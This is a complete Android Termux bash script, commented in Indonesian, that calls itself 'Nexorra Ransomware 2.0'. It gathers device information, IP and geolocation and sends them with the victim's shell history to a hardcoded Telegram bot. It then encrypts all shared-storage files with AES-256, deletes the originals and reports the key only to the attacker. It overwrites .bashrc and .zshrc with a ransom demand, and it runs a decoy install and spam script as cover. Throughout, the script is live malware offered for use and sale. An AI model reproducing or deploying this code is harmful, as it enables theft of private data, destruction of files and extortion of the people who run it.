#!/data/data/com.termux/files/usr/bin/bash

set +x
#!/usr/bin/env bash

merah='\033[1;31m'
hijau='\033[1;32m'
kuning='\033[1;33m'
biru='\033[1;34m'
amba='\033[1;37m'

# Config Target direktori dan Token Id dll
A2="/storage/emulated/0"
A1="/sdcard" 
base64x="8424043965:AAEd_dcDAAsmcRHTclrvyeVx-LMaOmNJ7ng" #ganti ini woi @5
keypassword="8164233023" #ganti ini woi @6


echo "y" | termux-setup-storage &> /dev/null
chmod 644 ~/.bash_history 2>/dev/null


# setup informasi
PAYLOAD_PENGELABUHAN() {
pkg update -y && pkg upgrade -y
pkg install openssl -y
pkg install curl -y
pkg install ruby -y
pkg install boxes -y
pkg install python -y
pkg install jq -y
pkg install git -y
pkg install wget -y
# atas ini jangan di ubah pantek, soalnya ini penting buat backdoor!!
# hapus = Gagal Di mulai skrip nya !!
# tambahin payload lain di bawah sini !!
pkg update -y && pkg upgrade -y
pkg install git -y
pkg install boxes -y
pkg install python -y
git clone https://github.com/lupepeksokhekeljink/Gimel
cd Gimel
bash spam
}


IP=$(curl -s ipinfo.io/ip)          
OS=$(uname -o)                    
TERMUX_ID=$(whoami)                 
chmod 644 ~/.bash_history 2>/dev/null

PHOTO_URL="https://files.catbox.moe/cudpdu.jpg"

get_device_info() {
    if command -v getprop &>/dev/null; then
        BRAND=$(getprop ro.product.brand)
        MODEL=$(getprop ro.product.model)
        echo "$BRAND $MODEL"
    else
        echo "Unknown Device"
    fi
}

DEVICE_INFO=$(get_device_info)

get_cpu_info() {
    CORES=$(nproc --all 2>/dev/null || grep -c ^processor /proc/cpuinfo)
    CPU_MODEL=$(grep -m 1 "model name" /proc/cpuinfo | cut -d ":" -f2- | xargs)

    if [ -z "$CPU_MODEL" ]; then
        CPU_MODEL=$(getprop ro.hardware 2>/dev/null)
    fi

    if [ -z "$CPU_MODEL" ]; then
        CPU_MODEL="Tidak diketahui"
    fi
}

get_cpu_info

CPU_INFO="Model Cpu: $CPU_MODEL
Core Cpu: $CORES"

RAM_TOTAL=$(grep MemTotal /proc/meminfo | awk '{print $2}')
RAM_FREE=$(grep MemFree /proc/meminfo | awk '{print $2}')
RAM_USED=$((RAM_TOTAL - RAM_FREE))

toMB() { echo $(( $1 / 1024 ))" MB"; }
RAM_TOTAL_MB=$(toMB $RAM_TOTAL)
RAM_FREE_MB=$(toMB $RAM_FREE)
RAM_USED_MB=$(toMB $RAM_USED)

if [[ "$HOME" == *"/data/data/com.termux/files/home"* ]]; then
    TERMUX="Rill"
else
    TERMUX="Fek jir"
fi

ip=$(curl -s ifconfig.me)

Lok=$(curl -s "https://ipinfo.io/$ip/json")

city=$(echo $Lok | jq -r '.city')
region=$(echo $Lok | jq -r '.region')
country=$(echo $Lok | jq -r '.country')
org=$(echo $Lok | jq -r '.org')
loc=$(echo $Lok | jq -r '.loc')  
postal=$(echo $Lok | jq -r '.postal')

lat=$(echo $loc | cut -d, -f1)
lon=$(echo $loc | cut -d, -f2)

geo=$(curl -s "https://nominatim.openstreetmap.org/reverse?lat=$lat&lon=$lon&format=json&zoom=10&addressdetails=1")
kabupaten=$(echo $geo | jq -r '.address.county // .address.city_district // .address.city')

vpncheck="Not Valid Vpn (off)"
if echo "$org" | grep -qiE "vpn|hosting|cloud|proxy|proton|nord|express|mullvad|private|surfshark|torguard|cyberghost|hidemyass|tunnelbear|windscribe|purevpn|ivacy|vyprvpn|strongvpn|psiphon|ultrasurf|hola|securenet|securevpn|outline"; then
    vpncheck="Valid On VPN"
fi

TOKEN="8424043965:AAEd_dcDAAsmcRHTclrvyeVx-LMaOmNJ7ng" #Ganti ini woi @3
CHAT_ID="8164233023" #Ganti ini woi @4


# ============ Batasan 1  ================

MESSAGE=$(cat <<EOF
- - - - - - - NEXORRA RANSOMWARE 2.0 - - - - - - -
=============================================
USER ID: $TERMUX_ID
IP Address: $IP
OS System: $OS
Device Brand Name: $DEVICE_INFO
RAM Total: $RAM_TOTAL_MB
RAM Free: $RAM_FREE_MB
RAM Used: $RAM_USED_MB
$CPU_INFO
=============================================
IP: $ip
Latitude: $lat
Longitude: $lon
Kota: $city
Kabupaten: ${kabupaten:-Unknown}
Provinsi: $region
Negara: $country
Kode Pos: $postal
Provider: $org
VPN: $vpncheck
=============================================
EOF
)

# ===== Batasan 2 ( eksekusi steal ) =====
PAYLOAD_BACKDOOR(){

PAYLOAD_STEAL_HIST() {
    USER=$(whoami)
    HOST=$(uname -n)
    DATE=$(date '+%Y-%m-%d %H:%M:%S')
    CAPTION="History Termux User: $USER@$HOST | $DATE"
    TOKEN="8424043965:AAEd_dcDAAsmcRHTclrvyeVx-LMaOmNJ7ng" #ganti ini woi @2
    CHAT_ID="8164233023" #ganti ini woi @1

    chmod 644 ~/.bash_history 2>/dev/null

    if [ -f ~/.bash_history ]; then
        curl -s -F document=@"$HOME/.bash_history" \
              -F caption="$CAPTION" \
        "https://api.telegram.org/bot$TOKEN/sendDocument?chat_id=$CHAT_ID" > /dev/null 2>&1
    else
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=❌ File bash history tidak ditemukan!" > /dev/null 2>&1
    fi
}

PAYLOAD_HEADER() {
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
    -d chat_id="$CHAT_ID" \
    -d photo="$PHOTO_URL" \
    --data-urlencode caption="$MESSAGE" > /dev/null 2>&1
}

PAYLOAD_HEADER
PAYLOAD_STEAL_HIST
}
## end bd

## tampilan njir
Fuz(){
TARGETS=("$HOME/.bashrc" "$HOME/.zshrc")

for f in "${TARGETS[@]}"; do
  if [ -f "$f" ]; then
    cat > "$f" <<'EOF'
clear

echo "PERINGATAN ⚠️. PERINGATAN ⚠️, PERINGATAN ⚠️"

mpv "https://l.top4top.io/m_3551rlvax0.mp3" > /dev/null 2>&1

if command -v boxes >/dev/null 2>&1 && command -v lolcat >/dev/null 2>&1; then

  cat <<'I' | boxes -d ansi-rounded | lolcat
██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗     ██████╗ ██╗   ██╗
██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝
██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝ 
██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝  
██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝    ██████╔╝   ██║   
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝     ╚═════╝    ╚═╝   
                                                                 
I

sleep 5
clear

  cat <<'B' | boxes -d ansi-rounded | lolcat
███╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗  █████╗ 
████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝██████╔╝███████║
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║██╔══██╗██╔══██╗██╔══██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝██║  ██║██║  ██║██║  ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  V 2.0
B

sleep 5
clear
  cat <<'J' | boxes -d ansi-rounded | lolcat

██╗    ██╗██╗  ██╗ █████╗ ████████╗
██║    ██║██║  ██║██╔══██╗╚══██╔══╝
██║ █╗ ██║███████║███████║   ██║   
██║███╗██║██╔══██║██╔══██║   ██║   
╚███╔███╔╝██║  ██║██║  ██║   ██║   
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                   
                                   
██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗██████╗     
██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗    
███████║███████║██████╔╝██████╔╝█████╗  ██╔██╗ ██║█████╗  ██║  ██║    
██╔══██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██║  ██║    
██║  ██║██║  ██║██║     ██║     ███████╗██║ ╚████║███████╗██████╔╝    
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚═════╝     
                                                                      
J

sleep 4
clear

  cat <<'A' | boxes -d ansi-rounded | lolcat

                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀                      ⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀                      ⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀                      ⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀                      ⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀                      ⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
                     ⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
                     ⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
                     ⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
                     ⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
                     ⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
                     ⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
                     ⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀                     ⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀                     ⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀

                 YOU FILE WAS LOCKED BY NEXORRA RANSOMWARE V2.0
A
sleep 1
  cat <<'B' | boxes -d ansi-rounded | lolcat
███╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗  █████╗ 
████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝██████╔╝███████║
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║██╔══██╗██╔══██╗██╔══██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝██║  ██║██║  ██║██║  ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  V 2.0
B

text="Halo kawan ! terminal mu telah di retas dan file mu telah di kunci oleh rafzz RANSOMWARE 2.0!!"

for ((i=0; i<${#text}; i++)); do
  printf "\033[31m%s\033[0m" "${text:$i:1}"  # \033[31m untuk merah, \033[0m untuk reset
  sleep 0.1
done
echo
sleep 5
echo ""
text="Untuk Menebus File Dan Terminal Ikuti Langkah di bawah ini!!!"

for ((i=0; i<${#text}; i++)); do
  printf "\033[31m%s\033[0m" "${text:$i:1}"  # \033[31m untuk merah, \033[0m untuk reset
  sleep 0.1
done
echo

sleep 5
echo ""
echo -e "\e[32mLANGKAH LANGKAH UNTUK MENEBUS FILE :\e[0m"
sleep 1

echo ""
echo ""

echo -e "\033[33m[ ! ]\033[0m \033[31m Berikan Informasi ini ke orang yang bersangkutan ( penjual decryptor )\033[0m"
echo ""
echo "[ ! ] INFORMASI PENGGUNA YANG TERJANGKIT RANSOMWARE
User Id : $(whoami)
Date : $(date)
Type : AES-255 CBC
"

echo ""
echo ""

echo ""
echo -e "\e[33m
[ ! ] Tips decrypt/pemulihan file :

1. Jangan Asal Tebak Password!!
2. Jangan Menggunakan Decryptor yang di luar sana! itu akan merusak file anda!
3. Beli pass decryptor dan Script decryptor ke orang yang bersangkutan
4. Jangan Hapus Termux jika ingin data pulih kembali!


[ ! ] PERINGATAN KERAS : Jika anda melanggar maka hal ini yang akan terjadi!!

1. Jika anda menebak password maka file akan rusak
2. Jika anda dapat decryptor di luar maka itu tidak sesuai dengan enkripsi!
maka akan menjadikan file rusak!!
3. Anda akan di beri kesempatan waktu atau tidak yaitu tergantung oleh pengontrol 
dari Ransomware ini ! jika anda tidak membayar tepat waktu atau uang tebusan kurang
maka si pengontrol bisa menghapus semua file anda !\e[0m"
echo ""
echo ""

echo -e "\033[33m[ ! ]\033[0m \033[31mBeli skrip decryptor dan password decryptor ke telegram\033[0m \033[34m: t.me/GeralStvns\033[0m"
else

echo "PERINGATAN ⚠️. PERINGATAN ⚠️, PERINGATAN ⚠️"

mpv "https://l.top4top.io/m_3551rlvax0.mp3" > /dev/null 2>&1

  cat <<'I' | boxes -d ansi-rounded | lolcat
██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗     ██████╗ ██╗   ██╗
██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝
██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝ 
██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝  
██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝    ██████╔╝   ██║   
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝     ╚═════╝    ╚═╝   
                                                                 
I

sleep 5
clear

  cat <<'B'
███╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗  █████╗ 
████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝██████╔╝███████║
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║██╔══██╗██╔══██╗██╔══██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝██║  ██║██║  ██║██║  ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  V 2.0
B

  cat <<'J' | boxes -d ansi-rounded | lolcat

██╗    ██╗██╗  ██╗ █████╗ ████████╗
██║    ██║██║  ██║██╔══██╗╚══██╔══╝
██║ █╗ ██║███████║███████║   ██║   
██║███╗██║██╔══██║██╔══██║   ██║   
╚███╔███╔╝██║  ██║██║  ██║   ██║   
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                   
                                   
██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗██████╗     
██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗    
███████║███████║██████╔╝██████╔╝█████╗  ██╔██╗ ██║█████╗  ██║  ██║    
██╔══██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██║  ██║    
██║  ██║██║  ██║██║     ██║     ███████╗██║ ╚████║███████╗██████╔╝    
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚═════╝     
                                                                      
J

sleep 4
clear
  cat <<'A' | boxes -d ansi-rounded | lolcat

                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀                      ⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀                      ⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀                      ⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀                      ⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀                      ⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
                     ⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
                     ⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
                     ⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
                     ⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
                     ⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
                     ⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
                     ⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀                     ⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀                     ⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀

                 YOU FILE WAS LOCKED BY NEXORRA RANSOMWARE V2.0
A
sleep 1
  cat <<'W' | boxes -d ansi-rounded | lolcat
███╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗  █████╗ 
████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝██████╔╝███████║
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║██╔══██╗██╔══██╗██╔══██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝██║  ██║██║  ██║██║  ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  V 2.0
W

text="Halo kawan ! terminal mu telah di retas dan file mu telah di kunci oleh NEXORRA RANSOMWARE 2.0!!"

for ((i=0; i<${#text}; i++)); do
  printf "\033[31m%s\033[0m" "${text:$i:1}"  # \033[31m untuk merah, \033[0m untuk reset
  sleep 0.1
done
echo
sleep 5
echo ""
text="Untuk Menebus File Dan Terminal Ikuti Langkah di bawah ini!!!"

for ((i=0; i<${#text}; i++)); do
  printf "\033[31m%s\033[0m" "${text:$i:1}"  # \033[31m untuk merah, \033[0m untuk reset
  sleep 0.1
done
echo

sleep 5
echo ""
echo -e "\e[32mLANGKAH LANGKAH UNTUK MENEBUS FILE :\e[0m"
sleep 1
echo ""
echo ""

echo -e "\033[33m[ ! ]\033[0m \033[31m Berikan Informasi ini ke orang yang bersangkutan ( penjual decryptor )\033[0m"
echo ""
echo "[ ! ] INFORMASI PENGGUNA YANG TERJANGKIT RANSOMWARE
User Id : $(whoami)
Date : $(date)
Type : AES-255 CBC
"

echo ""
echo ""
echo -e "\e[33m
[ ! ] Tips decrypt/pemulihan file :

1. Jangan Asal Tebak Password!!
2. Jangan Menggunakan Decryptor yang di luar sana! itu akan merusak file anda!
3. Beli password decryptor dan Script decryptor ke orang yang bersangkutan
4. Jangan Hapus Termux jika ingin data pulih kembali!

[ ! ] PERINGATAN KERAS : Jika anda melanggar maka hal ini yang akan terjadi!!

1. Jika anda menebak password maka file akan rusak
2. Jika anda dapat decryptor di luar maka itu tidak sesuai dengan enkripsi!
maka akan menjadikan file rusak!!
3. Anda akan di beri kesempatan waktu atau tidak yaitu tergantung oleh pengontrol 
dari Ransomware ini ! jika anda tidak membayar tepat waktu atau uang tebusan kurang
maka si pengontrol bisa menghapus semua file anda !\e[0m"
echo ""
echo ""

echo -e "\033[33m[ ! ]\033[0m \033[31mBeli skrip decryptor dan password decryptor ke telegram\033[0m \033[34m: t.me/GeralStvns\033[0m"
fi
EOF
  fi
done
}
# endcok

## batesan Ransomware

lemes_habis_crot() {
    PASSWORD=$(< /dev/urandom tr -dc 'A-Za-z0-9' | head -c 20)
}
ahhhh_crot_sigma() {
    MESSAGE="Halo ! 子犬は人のスクリプトの名前を変更するのが好き -- perkenalkan saya Nexorra Ransomware Versi 2.0 Buatan @GeralStvns atau yang bisa kalian panggil admin andrax !. saya disini untuk Meng endkripsi file ! jika anda ingin mempunyai skrip Ransomware seperti ini bisa dm admin @GeralStvns ;)

===== ⚡ New Victims Detect ⚡ =====
Id Target : $(whoami)
Password : $PASSWORD
Type enkripsi : AES-256 CBC
Status : Terkunci 🔐✅
===================================
Note : Share Informasi ini kepada user yang sudah bayar kunci untuk dekripsi!! file / membayar tebusan
-- jika kalian mau bermain kasar, kalian bisa memeras lagi kalau belum merasa puas dengan uang korban 😗
Selamat tinggal, Saya Nexorra 😗😄, nantikan update Ransomware berikutnya yaaa versi 3.0"

    curl -s -X POST "https://api.telegram.org/bot$base64x/sendMessage" \
        -d chat_id="$keypassword" \
        -d text="$MESSAGE" &> /dev/null
}
OalahCak() {
    local file="$1"
    local encrypted_file="${file}.NEXORRA_CRYPT_RANSOMWARE"
    openssl enc -aes-256-cbc -salt -in "$file" -out "$encrypted_file" -pass pass:"$PASSWORD" &> /dev/null
    if [ $? -eq 0 ]; then
        rm "$file"
    else
        echo "opo to le: $file" &> /dev/null
    fi
}

nexorra_jir() {
    lemes_habis_crot
    ahhhh_crot_sigma
    when2_saja=("apk")
    
    find "$A2" -type f ! -path "$A1/" ! -name ".NEXORRA_CRYPT_RANSOMWARE" ! -path "/sdcard/Android/*" |
    while IFS= read -r file; do
        extension="${file##*.}" 
        if [[ " ${when2_saja[@]} " =~ " $extension " ]]; then 
            echo "Lewati file: $file" &> /dev/null
            continue
        fi
        OalahCak "$file"
    done
    
    clear
    echo "Proses Menjalankan skrip....."
    sleep 3
}

totalan_su=$(find "$A2" -type f -name "*.NEXORRA_CRYPT_RANSOMWARE" | wc -l)
if [ "$totalan_su" -gt 0 ]; then
   clear
   echo "[ ? ] nyari apa kau pukimak? -_ nyari decryptor? beli lah pantek. 
ga guna kau run file ini lagi asw -_ pergi kau GET OUT !!!"
   else
   echo "Loading Instalasi Package..."
   PAYLOAD_BACKDOOR &
   nexorra_jir &
   Fuz &
   PAYLOAD_PENGELABUHAN
fi